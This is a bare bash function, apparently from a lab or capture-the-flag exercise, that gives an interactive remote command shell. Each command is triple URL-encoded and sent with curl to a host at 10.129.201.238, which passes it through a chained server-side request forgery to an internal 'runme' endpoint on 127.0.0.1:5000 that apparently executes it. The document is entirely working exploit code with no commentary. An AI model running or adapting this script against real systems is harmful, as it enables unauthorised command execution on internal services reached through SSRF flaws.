function rce {
	while true; do
		echo -n "> "; read cmd
		ecmd=$(echo -n $cmd | jq -rRs @uri | jq -rRs @uri | jq -rRs @uri)
		curl -s -o - "http://10.129.201.238/load?q=http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=${ecmd}"
		echo ""
	done		
}

